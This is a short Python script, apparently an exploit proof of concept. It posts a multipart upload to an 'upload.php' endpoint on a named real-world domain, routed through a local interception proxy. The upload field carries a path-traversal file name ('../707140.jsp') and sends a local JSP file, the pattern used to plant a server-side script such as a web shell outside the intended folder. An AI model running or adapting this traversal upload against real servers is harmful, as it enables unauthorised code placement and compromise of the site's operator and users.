import requests

proxies = {
    'http':'http://127.0.0.1:8080',
    'https':'https://127.0.0.1:8080',
}
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
}
files = {
    'uploadFile':('../707140.jsp',
                  open("test.jsp"),
                  "application/octet-stream")
        }

requests.post("http://www.baidu.com/upload.php",files = files,proxies=proxies)